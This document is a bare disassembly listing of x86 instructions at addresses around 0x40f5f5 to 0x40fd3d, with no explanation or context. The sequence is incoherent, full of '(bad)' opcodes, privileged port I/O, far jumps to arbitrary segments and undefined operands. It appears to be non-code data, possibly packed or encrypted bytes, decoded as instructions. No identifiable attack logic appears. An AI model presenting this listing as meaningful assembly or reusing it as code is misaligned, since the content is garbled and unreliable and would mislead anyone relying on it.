  40f5f5:	sbb    BYTE PTR [eax-0x12],dl
  40f5f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5f9:	adc    DWORD PTR [esi+0x24],esi
  40f5fc:	in     ax,0x2
  40f5ff:	jge    0x40f588
  40f601:	xchg   edx,eax
  40f602:	mov    DWORD PTR ds:0x25c5110f,ecx
  40f608:	adc    al,0xa0
  40f60a:	pop    eax
  40f60b:	pop    ebx
  40f60c:	(bad)  
  40f60e:	push   ebx
  40f60f:	mov    gs,edx
  40f611:	sbb    BYTE PTR [edx],al
  40f613:	and    al,0x6e
  40f615:	fmul   DWORD PTR [ebx-0xe]
  40f618:	sar    dh,cl
  40f61a:	jl     0x40f5bc
  40f61c:	in     al,0xf7
  40f61e:	mov    al,ds:0x8b110380
  40f623:	bsr    esp,eax
  40f626:	sub    DWORD PTR [ebx],0xffffffb0
  40f629:	loop   0x40f5b0
  40f62b:	repnz out 0x53,al
  40f62e:	push   esp
  40f62f:	xor    DWORD PTR [ecx+ebp*2],eax
  40f632:	pop    ecx
  40f633:	xchg   ebx,eax
  40f634:	sub    eax,0x2ef1d45d
  40f639:	mov    eax,ds:0xd9f02a1d
  40f63e:	test   DWORD PTR [ecx-0x3efc5556],edi
  40f644:	or     al,0x2f
  40f646:	inc    eax
  40f647:	mov    ds,WORD PTR [edi+esi*8]
  40f64a:	js     0x40f5de
  40f64c:	(bad)  
  40f64d:	shr    BYTE PTR [eax+0x20],1
  40f650:	sar    BYTE PTR [edi+0x53505ba5],cl
  40f656:	pop    ds
  40f657:	ins    BYTE PTR es:[edi],dx
  40f658:	stos   BYTE PTR es:[edi],al
  40f659:	adc    edi,esp
  40f65b:	and    al,0x1c
  40f65d:	add    al,0x8b
  40f65f:	test   BYTE PTR [ebp-0x4b3e7ad2],cl
  40f665:	and    BYTE PTR [edi-0x776939c],ch
  40f66b:	xchg   ebx,eax
  40f66c:	and    BYTE PTR [eax+0x1625f926],dl
  40f672:	gs (bad) 
  40f674:	mov    ebx,0xd7ad8aa9
  40f679:	push   eax
  40f67a:	mov    DWORD PTR [ebx-0xc],edi
  40f67d:	stc    
  40f67e:	push   esi
  40f67f:	fwait
  40f680:	mov    esi,0x3c977f4b
  40f685:	(bad)  
  40f686:	cli    
  40f687:	pop    ebx
  40f688:	mov    DWORD PTR [esi+0x459ee9e2],edi
  40f68e:	nop
  40f68f:	jp     0x40f663
  40f691:	pop    eax
  40f692:	dec    edi
  40f693:	jmp    0x1498:0xf0aa07b8
  40f69a:	dec    ebp
  40f69b:	pushf  
  40f69c:	data16 mov ah,0x8b
  40f69f:	imul   ecx,DWORD PTR [eax],0x68bac5c2
  40f6a5:	les    eax,FWORD PTR [ebp+0x579f23e2]
  40f6ab:	addr16 test DWORD PTR ds:[bx+si-0x50fc],ebp
  40f6b2:	test   DWORD PTR [edi-0x10],eax
  40f6b5:	push   eax
  40f6b6:	inc    edx
  40f6b7:	push   0xffffffdc
  40f6b9:	lea    eax,[esi+esi*4+0x60218ce5]
  40f6c0:	and    ch,BYTE PTR [esi+0x3]
  40f6c3:	push   edx
  40f6c4:	imul   ebx,DWORD PTR [esi],0x5942a5cb
  40f6ca:	into   
  40f6cb:	xchg   DWORD PTR [esp+ebx*4-0x1d7c8c7b],esp
  40f6d2:	inc    edx
  40f6d3:	or     eax,ebx
  40f6d5:	mov    al,0xd2
  40f6d7:	mov    bh,BYTE PTR [ebp-0x45]
  40f6da:	aaa    
  40f6db:	stc    
  40f6dc:	movups xmm2,xmm7
  40f6df:	outs   dx,BYTE PTR ds:[esi]
  40f6e0:	push   ss
  40f6e1:	fisttp QWORD PTR [eax+0x286ed2d6]
  40f6e7:	xor    dh,cl
  40f6e9:	aas    
  40f6ea:	mov    DWORD PTR [ebx+ebp*1],esi
  40f6ed:	outs   dx,DWORD PTR ds:[esi]
  40f6ee:	stc    
  40f6ef:	mov    ds,ebx
  40f6f1:	inc    esp
  40f6f2:	mov    dl,0x4
  40f6f4:	loopne 0x40f6ec
  40f6f6:	sub    ebp,DWORD PTR [edx]
  40f6f8:	ror    DWORD PTR [edx-0xa],0x9d
  40f6fc:	xchg   edx,eax
  40f6fd:	mov    eax,0x7b269b03
  40f702:	lea    ecx,[esi+0xccaf8ea]
  40f708:	pop    eax
  40f709:	sub    ah,BYTE PTR ds:0x1142d21d
  40f70f:	mov    eax,ds:0x80516ce1
  40f714:	xor    eax,0xef22241e
  40f719:	jecxz  0x40f6ec
  40f71b:	cmp    edi,DWORD PTR [ebp-0x2de793cf]
  40f721:	xchg   ecx,eax
  40f722:	jo     0x40f71b
  40f724:	retf   
  40f725:	imul   ecx,DWORD PTR [esi],0xffffff9e
  40f728:	xchg   ebp,eax
  40f729:	adc    DWORD PTR [edi],esi
  40f72b:	push   ss
  40f72c:	je     0x40f75e
  40f72e:	jp     0x40f76e
  40f730:	mov    eax,ds:0x717f39dc
  40f735:	push   ds
  40f736:	push   ds
  40f737:	arpl   di,si
  40f739:	xchg   DWORD PTR [si],eax
  40f73c:	or     eax,0x9b146317
  40f741:	push   0x481acd2e
  40f746:	stc    
  40f747:	or     eax,DWORD PTR [ecx+0x509a823d]
  40f74d:	rcr    DWORD PTR [edi+0x60],cl
  40f750:	jnp    0x40f770
  40f752:	(bad)  
  40f753:	dec    ebx
  40f754:	(bad)  
  40f756:	outs   dx,DWORD PTR ds:[esi]
  40f757:	add    dh,BYTE PTR [edx+edi*8-0xd66e7b]
  40f75e:	into   
  40f75f:	outs   dx,BYTE PTR ds:[esi]
  40f760:	out    0xfc,eax
  40f762:	retf   
  40f763:	in     al,0xb7
  40f765:	adc    esp,eax
  40f767:	dec    edx
  40f768:	jg     0x40f75d
  40f76a:	imul   ebx,DWORD PTR [edx+0x2c852e73],0x49b7d6d0
  40f774:	inc    ebp
  40f775:	ficomp DWORD PTR [esi-0x7a6a315b]
  40f77b:	jge    0x40f719
  40f77d:	pop    ecx
  40f77e:	adc    edi,edi
  40f780:	loope  0x40f76a
  40f782:	test   edi,ecx
  40f784:	nop
  40f785:	cmp    ebx,DWORD PTR [edx-0x6af908a2]
  40f78b:	out    dx,al
  40f78c:	add    al,0x11
  40f78e:	mov    ch,0xfa
  40f790:	xchg   ecx,eax
  40f791:	cli    
  40f792:	aaa    
  40f793:	or     bh,0xef
  40f796:	test   DWORD PTR [ecx],esi
  40f798:	add    al,BYTE PTR [edx+ecx*4-0x5b]
  40f79c:	cli    
  40f79d:	mov    edi,0xa9b18e46
  40f7a2:	cwde   
  40f7a3:	into   
  40f7a4:	stc    
  40f7a5:	pop    esi
  40f7a6:	popf   
  40f7a7:	retf   
  40f7a8:	rol    bl,cl
  40f7aa:	fwait
  40f7ab:	sub    DWORD PTR [ebx*8+0x1e5ca972],esi
  40f7b2:	stos   BYTE PTR es:[edi],al
  40f7b3:	shl    BYTE PTR [ecx-0x69],1
  40f7b6:	pop    edi
  40f7b7:	retf   0x19aa
  40f7ba:	nop
  40f7bb:	xor    eax,0xfd9411f0
  40f7c0:	cmp    al,BYTE PTR [edi-0x23]
  40f7c3:	mov    bh,0xb8
  40f7c5:	add    eax,0x9e03dbe3
  40f7ca:	ss test al,0x7
  40f7cd:	sar    BYTE PTR [ebx-0x26],1
  40f7d0:	xor    DWORD PTR ds:0x5524ef,esp
  40f7d6:	inc    ebp
  40f7d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7d8:	mov    ds:0x8932cb90,al
  40f7dd:	adc    ecx,ebp
  40f7df:	sub    DWORD PTR [esi],eax
  40f7e1:	adc    esp,DWORD PTR [ebx-0x7a666627]
  40f7e7:	(bad)  
  40f7e8:	mov    esi,0x4ce73ee5
  40f7ed:	mov    bl,0xbf
  40f7ef:	test   al,0x55
  40f7f1:	or     eax,0x3057140a
  40f7f6:	add    al,0x3c
  40f7f8:	cmp    DWORD PTR [edx-0x73],esi
  40f7fb:	(bad)  
  40f7fc:	jge    0x40f7fb
  40f7fe:	leave  
  40f7ff:	int    0xd2
  40f801:	pop    ebx
  40f802:	mov    eax,0x9e5c35d3
  40f807:	xchg   ecx,eax
  40f808:	stos   BYTE PTR es:[edi],al
  40f809:	jne    0x40f80e
  40f80b:	mov    gs,WORD PTR [esp+ecx*4+0x3cc3983f]
  40f812:	imul   edx,DWORD PTR [edx*8-0x179a1d0e],0x80ae6997
  40f81d:	sub    ecx,esi
  40f81f:	push   esi
  40f820:	adc    BYTE PTR [edi],dl
  40f822:	ja     0x40f83a
  40f824:	loope  0x40f7b7
  40f826:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f827:	aad    0x28
  40f829:	mov    cl,0xf
  40f82b:	in     al,dx
  40f82c:	rcr    BYTE PTR [ebp-0x78a6c349],cl
  40f832:	adc    al,0x9b
  40f834:	xor    dl,BYTE PTR [ecx]
  40f836:	dec    edi
  40f837:	pusha  
  40f838:	xchg   bh,bl
  40f83a:	dec    ebx
  40f83b:	mov    ds:0x21853fb7,eax
  40f840:	(bad)  
  40f841:	bound  edx,QWORD PTR [ebp-0x7a]
  40f844:	sbb    dh,0x99
  40f847:	mov    cs,WORD PTR [esi+0x31b68ed8]
  40f84d:	cs daa 
  40f84f:	not    edx
  40f851:	sbb    eax,0x7e58bb10
  40f856:	bound  ecx,QWORD PTR [ecx]
  40f858:	lods   eax,DWORD PTR ds:[esi]
  40f859:	adc    DWORD PTR [ebx],ecx
  40f85b:	adc    ch,bl
  40f85d:	mov    ah,0x2b
  40f85f:	and    al,0xbe
  40f861:	fadd   QWORD PTR [edi+eiz*1+0x64698afc]
  40f868:	jmp    0x53bdce02
  40f86d:	aad    0x1
  40f86f:	lahf   
  40f870:	sbb    al,0xe2
  40f872:	int    0x45
  40f874:	addr16 out 0x5,eax
  40f877:	push   es
  40f878:	mov    al,0x72
  40f87a:	jmp    0x40f8c4
  40f87c:	xor    DWORD PTR ds:0x6c62c6fb,ecx
  40f882:	test   BYTE PTR [edi+0xd8c07e4],ah
  40f888:	adc    BYTE PTR [ebx],ch
  40f88a:	pusha  
  40f88b:	sahf   
  40f88c:	jge    0x40f838
  40f88e:	push   esp
  40f88f:	mov    es,WORD PTR [ebp-0x6240b65b]
  40f895:	enter  0x1b85,0x76
  40f899:	cld    
  40f89a:	scas   eax,DWORD PTR es:[edi]
  40f89b:	inc    eax
  40f89c:	(bad)  
  40f89d:	int3   
  40f89e:	popa   
  40f89f:	lea    ebx,[esi+ebp*2]
  40f8a2:	(bad)  
  40f8a3:	mov    ch,0xad
  40f8a5:	sbb    DWORD PTR [ebx-0x22],esp
  40f8a8:	ins    DWORD PTR es:[edi],dx
  40f8a9:	inc    ecx
  40f8aa:	pop    ebx
  40f8ab:	cli    
  40f8ac:	mov    dh,0x9f
  40f8ae:	test   DWORD PTR [eax],edi
  40f8b0:	cdq    
  40f8b1:	jnp    0x40f865
  40f8b3:	or     esi,DWORD PTR [ebp+0x63]
  40f8b6:	aam    0xab
  40f8b8:	cmp    esp,DWORD PTR [ebp-0x10f651fb]
  40f8be:	repz or al,0x26
  40f8c1:	nop
  40f8c2:	test   edi,esp
  40f8c4:	xor    al,0xa4
  40f8c6:	xor    DWORD PTR [eax-0xa],0x32e8ac48
  40f8cd:	pop    es
  40f8ce:	add    DWORD PTR [edi+ebp*2-0x22],0x50
  40f8d3:	jle    0x40f86e
  40f8d5:	scas   eax,DWORD PTR es:[edi]
  40f8d6:	xchg   edi,eax
  40f8d7:	fs rcl dh,cl
  40f8da:	push   0x7f53568d
  40f8df:	sbb    DWORD PTR [edi],ecx
  40f8e1:	adc    DWORD PTR [edx+0x18],ebx
  40f8e4:	and    bx,dx
  40f8e7:	xchg   ebx,eax
  40f8e8:	inc    ebp
  40f8e9:	gs rcr al,1
  40f8ec:	rol    edi,cl
  40f8ee:	mov    WORD PTR [ebx],?
  40f8f0:	xor    cl,BYTE PTR [esi-0x34ddf165]
  40f8f6:	inc    ebx
  40f8f7:	mov    gs,WORD PTR [esi]
  40f8f9:	popa   
  40f8fa:	not    DWORD PTR [ebx*2-0x56df3531]
  40f901:	test   eax,0x6589c9e3
  40f906:	xor    al,0x25
  40f908:	mov    ch,dl
  40f90a:	ss stos BYTE PTR es:[edi],al
  40f90c:	xchg   esi,eax
  40f90d:	xchg   ebp,eax
  40f90e:	test   DWORD PTR [ebx-0x397ab05c],ebp
  40f914:	out    0x57,eax
  40f916:	std    
  40f917:	inc    BYTE PTR [ecx]
  40f919:	imul   eax,DWORD PTR [edi-0x2a734a72],0xffffffd3
  40f920:	xchg   edx,eax
  40f921:	adc    DWORD PTR [esi+0x4d3b6495],edi
  40f927:	sub    al,BYTE PTR [esi-0x46]
  40f92a:	test   DWORD PTR [ecx-0x5b],esp
  40f92d:	lods   eax,DWORD PTR ds:[esi]
  40f92e:	xchg   edi,eax
  40f92f:	shl    DWORD PTR [eax],0x38
  40f932:	retf   
  40f933:	mov    DWORD PTR [edx+edx*4+0x42],ebx
  40f937:	jmp    0x6ff3:0xb9530152
  40f93e:	retf   
  40f93f:	imul   ecx,esi,0xd22eab96
  40f945:	aam    0x6b
  40f947:	add    edi,DWORD PTR [ebx+0x71]
  40f94a:	jne    0x40f8da
  40f94c:	ja     0x40f8d6
  40f94e:	inc    ebx
  40f94f:	pusha  
  40f950:	mov    eax,esi
  40f952:	popf   
  40f953:	add    al,0xd2
  40f955:	sar    ecx,0xed
  40f958:	fstp   st(2)
  40f95a:	hlt    
  40f95b:	mov    al,ds:0x253d1e29
  40f960:	xor    edi,DWORD PTR [ebx]
  40f962:	test   al,0x81
  40f964:	outs   dx,DWORD PTR ds:[esi]
  40f965:	mov    bl,0x85
  40f967:	pushf  
  40f968:	es xchg ebp,eax
  40f96a:	(bad)  
  40f96b:	je     0x40f992
  40f96d:	into   
  40f96e:	adc    cl,BYTE PTR [esi+0x6636b9fd]
  40f974:	mov    BYTE PTR [ebx+0x19d1bbc8],ch
  40f97a:	pcmpeqd mm3,QWORD PTR [edx+0x6a5e651]
  40f981:	dec    ebp
  40f982:	test   al,0xa5
  40f984:	mov    WORD PTR [eax+ecx*1-0x61391f3a],gs
  40f98b:	push   ds
  40f98c:	sar    ebx,cl
  40f98e:	pop    es
  40f98f:	xchg   esp,eax
  40f990:	aad    0x84
  40f992:	stos   BYTE PTR es:[edi],al
  40f993:	lahf   
  40f994:	repnz push 0x3dad98cd
  40f99a:	call   0x52c5:0x5605699e
  40f9a1:	leave  
  40f9a2:	daa    
  40f9a3:	jmp    0x5c5d:0xb885d314
  40f9aa:	dec    edi
  40f9ab:	dec    esi
  40f9ac:	into   
  40f9ad:	or     ecx,DWORD PTR ss:[esi+0x48c9323f]
  40f9b4:	mov    ah,0x68
  40f9b6:	cmp    al,0x97
  40f9b8:	scas   eax,DWORD PTR es:[edi]
  40f9b9:	pop    esp
  40f9ba:	sbb    BYTE PTR [ecx+eax*2+0x20288883],0x87
  40f9c2:	dec    edx
  40f9c3:	push   ss
  40f9c4:	pop    eax
  40f9c5:	mov    cl,0xd8
  40f9c7:	mov    ?,WORD PTR [edi+0x1e9dfbff]
  40f9cd:	cmp    DWORD PTR [ebx+0x253fd2c8],ebx
  40f9d3:	xor    BYTE PTR [ebp+0x11],ch
  40f9d6:	ret    0x9c4f
  40f9d9:	adc    ecx,ebp
  40f9db:	mov    edi,0x505bb03a
  40f9e0:	or     edi,DWORD PTR [eax+ecx*4+0x4a8a5796]
  40f9e7:	ins    BYTE PTR es:[edi],dx
  40f9e8:	repz cdq 
  40f9ea:	sbb    bh,BYTE PTR [ecx-0x75]
  40f9ed:	adc    DWORD PTR [ecx+0x3d],edi
  40f9f0:	test   al,0x3d
  40f9f2:	dec    DWORD PTR gs:[ecx+0x57]
  40f9f6:	push   esp
  40f9f7:	mov    ebx,0xd8da04d2
  40f9fc:	dec    edx
  40f9fd:	mov    bh,0x10
  40f9ff:	mov    bl,0xd6
  40fa01:	pop    ss
  40fa02:	xchg   BYTE PTR [ecx-0x5a],cl
  40fa05:	jl     0x40fa4b
  40fa07:	shl    BYTE PTR [ebx+0x5c],cl
  40fa0a:	mov    edx,0x50aface0
  40fa0f:	fisubr WORD PTR [ecx]
  40fa11:	mov    dh,0xb7
  40fa13:	dec    esi
  40fa14:	mov    dl,0x6a
  40fa16:	xor    eax,0x58972a9
  40fa1b:	in     eax,0x31
  40fa1d:	mov    al,0x59
  40fa1f:	(bad)  
  40fa20:	mov    esi,0xbca4ee3a
  40fa25:	inc    esp
  40fa26:	test   al,0x4e
  40fa28:	rcl    BYTE PTR [eax+0x3d9b3ef7],cl
  40fa2e:	popf   
  40fa2f:	xchg   edx,eax
  40fa30:	and    bl,BYTE PTR [ebx+0x6a]
  40fa33:	dec    edi
  40fa34:	jmp    0xa6f7:0x72d8ff9c
  40fa3b:	sbb    eax,0xe5f8268d
  40fa40:	or     DWORD PTR [eax],0xa52d4984
  40fa46:	pop    eax
  40fa47:	push   esi
  40fa48:	sbb    BYTE PTR [ecx],dl
  40fa4a:	hlt    
  40fa4b:	rcl    DWORD PTR [esi],1
  40fa4d:	icebp  
  40fa4e:	fisubr DWORD PTR [ecx+0x40]
  40fa51:	inc    esi
  40fa52:	test   BYTE PTR [edi+0xb],dl
  40fa55:	jmp    0x40fa54
  40fa57:	adc    eax,0x8e73bafe
  40fa5c:	xor    eax,0xbfc3723e
  40fa61:	shl    ah,0x7a
  40fa64:	lods   eax,DWORD PTR ds:[esi]
  40fa65:	pop    ds
  40fa66:	sub    BYTE PTR [ebx-0x114021cf],bh
  40fa6c:	int    0x6c
  40fa6e:	sti    
  40fa6f:	mov    WORD PTR [ecx+0x2c771da4],?
  40fa75:	mov    ds:0xd20ffdc5,al
  40fa7a:	mov    BYTE PTR [edx],al
  40fa7c:	push   ebx
  40fa7d:	(bad)  
  40fa7e:	rol    cl,cl
  40fa80:	in     eax,0x81
  40fa82:	out    dx,al
  40fa83:	mov    eax,DWORD PTR [ecx+edx*1+0x37b475c5]
  40fa8a:	sar    DWORD PTR [edi],1
  40fa8c:	ret    0x93cb
  40fa8f:	inc    edi
  40fa90:	arpl   WORD PTR [esi+0x410c9303],bx
  40fa96:	jle    0x40fadd
  40fa98:	inc    esp
  40fa99:	push   ds
  40fa9a:	or     eax,0x113a36a0
  40fa9f:	cmp    BYTE PTR ds:0x45e2e984,cl
  40faa5:	pop    ebp
  40faa7:	inc    ecx
  40faa8:	pushf  
  40faa9:	or     eax,0x1e6b80d5
  40faae:	xor    ch,dl
  40fab0:	xor    ebx,DWORD PTR [ecx]
  40fab2:	adc    DWORD PTR [edi-0x71],0x32
  40fab6:	out    dx,al
  40fab7:	mul    cl
  40fab9:	inc    edx
  40faba:	jg     0x40fb32
  40fabc:	rcr    BYTE PTR [edi],1
  40fabe:	push   edi
  40fabf:	(bad)  
  40fac0:	push   esp
  40fac1:	push   ds
  40fac2:	xlat   BYTE PTR ds:[ebx]
  40fac3:	add    DWORD PTR [ebp+0x33caf219],ebx
  40fac9:	popf   
  40faca:	out    dx,al
  40facb:	(bad)  
  40facc:	(bad)  
  40facd:	mov    al,0xb4
  40facf:	out    dx,al
  40fad0:	push   0x6b
  40fad2:	test   DWORD PTR [ecx],ebx
  40fad4:	out    dx,al
  40fad5:	cld    
  40fad6:	cld    
  40fad7:	loopne 0x40faa3
  40fad9:	pop    ebp
  40fada:	push   0xd5bed223
  40fadf:	dec    ebp
  40fae0:	cmp    al,0x56
  40fae2:	jl     0x40fa79
  40fae4:	and    edx,DWORD PTR [ecx]
  40fae6:	jecxz  0x40faaa
  40fae8:	dec    ebx
  40fae9:	mov    ebx,0x3b84388
  40faee:	test   DWORD PTR [ecx+0x26af9f73],ecx
  40faf4:	enter  0xa2a5,0x8e
  40faf8:	xchg   edi,eax
  40faf9:	(bad)  
  40fafa:	jmp    0x40fa88
  40fafc:	dec    ebp
  40fafd:	ja     0x40fb28
  40faff:	and    DWORD PTR fs:[ebp-0x7c],ebp
  40fb03:	arpl   WORD PTR [edx+0x5c8d4c35],bp
  40fb09:	aaa    
  40fb0a:	mov    bh,0x8d
  40fb0c:	cli    
  40fb0d:	jo     0x40faed
  40fb0f:	mov    bl,0xbc
  40fb11:	pop    esp
  40fb12:	xchg   esi,eax
  40fb13:	int3   
  40fb14:	mov    bl,0x77
  40fb16:	cmp    BYTE PTR [esi+0x54],dl
  40fb19:	cs dec edx
  40fb1b:	sub    al,0xee
  40fb1d:	jae    0x40faae
  40fb1f:	add    al,0xf7
  40fb21:	add    eax,0xf1debb1
  40fb26:	test   DWORD PTR [edi-0x62103734],ecx
  40fb2c:	xor    al,0x1e
  40fb2e:	xor    BYTE PTR [edx],ch
  40fb30:	mov    dh,0xc7
  40fb32:	je     0x40fb6e
  40fb34:	mov    ebp,0xd2525975
  40fb39:	into   
  40fb3a:	lds    edx,FWORD PTR [edi-0x7fc19bd6]
  40fb40:	pop    ss
  40fb41:	add    eax,0x1e3ea31b
  40fb46:	sub    al,0x9b
  40fb48:	aas    
  40fb49:	test   BYTE PTR [eax-0x2e],cl
  40fb4c:	sbb    cl,BYTE PTR [eax+0x45a76985]
  40fb52:	test   DWORD PTR [ebp+0x5f],0x9eb022c1
  40fb59:	inc    edi
  40fb5a:	push   ecx
  40fb5b:	mov    es,eax
  40fb5d:	sahf   
  40fb5e:	daa    
  40fb5f:	fimul  DWORD PTR [ebp-0x594a7b89]
  40fb65:	or     DWORD PTR [edi+edi*2-0x718e05bc],esi
  40fb6c:	or     ch,BYTE PTR [ecx]
  40fb6e:	shl    BYTE PTR [ecx],cl
  40fb70:	fmulp  st(5),st
  40fb72:	adc    cl,bl
  40fb74:	rcl    BYTE PTR [edi-0x78],cl
  40fb77:	ins    BYTE PTR es:[edi],dx
  40fb78:	jne    0x40fb5c
  40fb7a:	test   al,0xee
  40fb7c:	lds    edx,FWORD PTR [ecx]
  40fb7e:	dec    esp
  40fb7f:	or     DWORD PTR [ebx+0x24084e54],edi
  40fb85:	dec    ebx
  40fb86:	test   dh,bh
  40fb88:	jge    0x40fbad
  40fb8a:	cmp    eax,0xdddedb6c
  40fb8f:	mov    ss,WORD PTR [eax-0x11]
  40fb92:	mov    ebx,0x4d3597e
  40fb97:	jmp    0xd2c62342
  40fb9c:	ja     0x40fb8c
  40fb9e:	ins    BYTE PTR es:[edi],dx
  40fb9f:	sub    BYTE PTR [eax+edi*1+0x69e28e43],al
  40fba6:	(bad)  
  40fba8:	aaa    
  40fba9:	pop    edi
  40fbaa:	xchg   esi,eax
  40fbab:	pop    eax
  40fbac:	ror    BYTE PTR ds:0x74f71a82,cl
  40fbb2:	pop    esi
  40fbb3:	inc    ebx
  40fbb4:	push   es
  40fbb5:	adc    BYTE PTR [esp+eiz*4],bh
  40fbb8:	xor    esi,edi
  40fbba:	ja     0x40fbdf
  40fbbc:	push   0xffffff94
  40fbbe:	ror    BYTE PTR [eax-0x161cb42e],0x3d
  40fbc5:	xchg   esp,eax
  40fbc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbc7:	iret   
  40fbc8:	pop    edi
  40fbc9:	push   ds
  40fbca:	push   edi
  40fbcb:	push   esi
  40fbcc:	mov    edi,edi
  40fbce:	js     0x40fb8c
  40fbd0:	popf   
  40fbd1:	sbb    BYTE PTR [ebp+0x3722f068],al
  40fbd7:	mov    ch,0x3a
  40fbd9:	xor    al,0x5a
  40fbdb:	test   al,0x4c
  40fbdd:	(bad)  
  40fbde:	test   DWORD PTR [edi-0x4f],ebp
  40fbe1:	and    eax,0x9e99ab83
  40fbe6:	test   DWORD PTR [edi+0x30be098d],ebx
  40fbec:	mov    gs,WORD PTR [eax-0x37]
  40fbef:	push   ds
  40fbf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbf1:	adc    esp,esi
  40fbf3:	(bad)  
  40fbf4:	scas   eax,DWORD PTR es:[edi]
  40fbf5:	int    0x67
  40fbf7:	out    0xfd,eax
  40fbf9:	icebp  
  40fbfa:	cld    
  40fbfb:	(bad)  
  40fbfc:	leave  
  40fbfd:	loopne 0x40fc43
  40fbff:	out    dx,al
  40fc00:	cmp    ecx,DWORD PTR [ecx]
  40fc02:	push   eax
  40fc03:	xor    BYTE PTR [edi+0x1e],dh
  40fc06:	inc    edi
  40fc07:	lods   al,BYTE PTR ds:[esi]
  40fc08:	(bad)  
  40fc09:	lods   eax,DWORD PTR ds:[esi]
  40fc0a:	push   esp
  40fc0b:	aas    
  40fc0c:	lahf   
  40fc0d:	cld    
  40fc0e:	in     al,dx
  40fc0f:	xchg   edi,eax
  40fc10:	pop    edi
  40fc11:	dec    ecx
  40fc12:	inc    esp
  40fc13:	in     eax,dx
  40fc14:	pop    edx
  40fc15:	ja     0x40fc1d
  40fc17:	inc    esp
  40fc18:	repnz pop ss
  40fc1a:	sub    DWORD PTR [ebp-0x587b94e8],ebx
  40fc20:	pushf  
  40fc21:	retf   0xa738
  40fc24:	sar    BYTE PTR [ebx+0x454a7e26],cl
  40fc2a:	jae    0x40fbf3
  40fc2c:	mov    DWORD PTR [ecx],edx
  40fc2e:	ret    
  40fc2f:	mov    ds:0xcc33a057,al
  40fc34:	push   DWORD PTR [ebx+0x48]
  40fc37:	sub    eax,0x8684d32a
  40fc3c:	scas   al,BYTE PTR es:[edi]
  40fc3d:	or     cl,BYTE PTR [edi-0x23]
  40fc40:	ins    BYTE PTR es:[edi],dx
  40fc41:	sbb    DWORD PTR ds:0xbedb2ace,0xffffff8d
  40fc48:	outs   dx,DWORD PTR ds:[esi]
  40fc49:	push   ebp
  40fc4a:	fistp  DWORD PTR [esi]
  40fc4c:	retf   0xc1cf
  40fc4f:	cli    
  40fc50:	jbe    0x40fc6d
  40fc52:	test   ebx,ecx
  40fc54:	add    esi,DWORD PTR [edi]
  40fc56:	push   ds
  40fc57:	dec    ebx
  40fc58:	push   DWORD PTR [ecx+0x74028eaa]
  40fc5e:	inc    eax
  40fc5f:	mov    edi,0x2f490528
  40fc64:	ror    BYTE PTR [ebx],cl
  40fc66:	xchg   esp,eax
  40fc67:	sbb    DWORD PTR [ebx],edx
  40fc69:	cmp    edi,DWORD PTR [edx+0x1a1e69a7]
  40fc6f:	out    dx,eax
  40fc70:	outs   dx,DWORD PTR ds:[esi]
  40fc71:	in     al,dx
  40fc72:	test   DWORD PTR [edx+0x3b],0xd24a6de3
  40fc79:	ss push cs
  40fc7b:	hlt    
  40fc7c:	xlat   BYTE PTR ds:[ebx]
  40fc7d:	or     BYTE PTR [esp+edx*8],cl
  40fc80:	xor    eax,0x988eb075
  40fc85:	aaa    
  40fc86:	pop    ss
  40fc87:	imul   BYTE PTR [ecx+eiz*8-0x2c2dc417]
  40fc8e:	push   eax
  40fc8f:	std    
  40fc90:	fwait
  40fc91:	pop    ebp
  40fc92:	icebp  
  40fc93:	and    BYTE PTR [ecx+0x1e],0x98
  40fc97:	stos   DWORD PTR es:[edi],eax
  40fc98:	cmp    BYTE PTR [edi],ch
  40fc9a:	xchg   ebx,eax
  40fc9b:	push   0x58853a2c
  40fca0:	or     ecx,edx
  40fca2:	(bad)  
  40fca3:	adc    al,0xef
  40fca5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fca7:	bound  ecx,QWORD PTR [esi]
  40fca9:	out    dx,al
  40fcaa:	inc    ebx
  40fcab:	mov    ds,esi
  40fcad:	sub    eax,0xc008b6f5
  40fcb2:	xor    BYTE PTR [ecx+eiz*8],cl
  40fcb5:	mov    ebx,0x33630e02
  40fcba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcbb:	paddusb mm1,QWORD PTR [eax+0x11bbe478]
  40fcc2:	add    eax,0x392cc355
  40fcc7:	inc    ecx
  40fcc8:	outs   dx,DWORD PTR ds:[esi]
  40fcc9:	mov    ecx,0x590a7985
  40fcce:	fidiv  DWORD PTR [ebx]
  40fcd0:	jge    0x40fc92
  40fcd2:	out    0x8e,al
  40fcd4:	pop    eax
  40fcd5:	mov    esp,0x46c18b93
  40fcda:	mov    ecx,0xb39dd27a
  40fcdf:	cmp    BYTE PTR [eax+0x3],0x9c
  40fce3:	lods   eax,DWORD PTR ds:[esi]
  40fce4:	cwde   
  40fce5:	adc    ebx,ebx
  40fce7:	xchg   edi,eax
  40fce8:	pop    ebp
  40fce9:	adc    BYTE PTR [eax-0x7b450650],ch
  40fcef:	out    0x6f,al
  40fcf1:	and    edi,0x6
  40fcf4:	xchg   ebx,eax
  40fcf5:	aaa    
  40fcf6:	ss aaa 
  40fcf8:	mov    ss,eax
  40fcfa:	adc    al,0x8e
  40fcfc:	xor    BYTE PTR [edi+ebx*8-0x7],dh
  40fd00:	bound  ebx,QWORD PTR [ebx-0x645db80c]
  40fd06:	test   DWORD PTR [edx-0x80f471c],ebx
  40fd0c:	neg    BYTE PTR [eax+ecx*1-0x1c]
  40fd10:	inc    edi
  40fd11:	push   ds
  40fd12:	pop    ecx
  40fd13:	pop    ss
  40fd14:	sub    esi,DWORD PTR [esp+esi*2]
  40fd17:	push   ecx
  40fd18:	xor    al,0x9b
  40fd1a:	iret   
  40fd1b:	int3   
  40fd1c:	and    BYTE PTR [edx-0x4b2d4c33],ah
  40fd22:	adc    ecx,ebp
  40fd24:	mov    ebx,DWORD PTR [eax+ebx*1]
  40fd27:	fisttp WORD PTR [esi]
  40fd29:	adc    BYTE PTR [eax+eiz*2+0x562592e0],dl
  40fd30:	jp     0x40fd32
  40fd32:	xor    al,0x69
  40fd34:	rol    BYTE PTR [edx+0x31],cl
  40fd37:	loope  0x40fd69
  40fd39:	pop    edi
  40fd3a:	lahf   
  40fd3b:	jo     0x40fda7
  40fd3d:	cmp    dl,BYTE PTR [edx+0x11]
